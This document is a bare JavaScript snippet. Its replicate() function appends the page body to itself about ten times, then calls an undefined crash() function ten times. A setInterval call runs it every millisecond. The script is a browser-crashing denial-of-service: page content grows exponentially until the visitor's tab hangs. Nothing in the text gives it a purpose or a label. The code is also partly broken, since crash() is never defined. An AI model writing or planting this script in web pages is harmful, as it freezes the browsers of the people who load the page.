function replicate() {
  document.body.innerHTML += 
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML;
  crash();
  crash();
  crash();
  crash();
  crash();
  crash();
  crash();
  crash();
  crash();
  crash();
}

setInterval(replicate, 1);
